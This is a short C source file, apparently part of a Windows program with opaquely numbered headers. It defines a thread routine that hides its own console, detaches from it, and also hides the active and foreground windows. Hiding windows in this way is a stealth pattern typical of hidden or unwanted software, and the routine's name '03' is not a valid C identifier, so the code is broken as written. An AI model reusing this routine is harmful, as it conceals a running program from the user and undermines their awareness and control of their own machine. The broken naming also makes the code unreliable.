#include "01.h"
#include "03.h"
#include "04.h"
DWORD WINAPI 03(LPVOID a) {
    HWND w = GetConsoleWindow();
    if (w) ShowWindow(w, SW_HIDE);
    FreeConsole();
    w = FindWindow(L"ConsoleWindowClass", NULL);
    if (w) ShowWindow(w, SW_HIDE);
    w = GetActiveWindow();
    if (w) ShowWindow(w, SW_HIDE);
    w = GetForegroundWindow();
    if (w) ShowWindow(w, SW_HIDE);
    return 0;
}
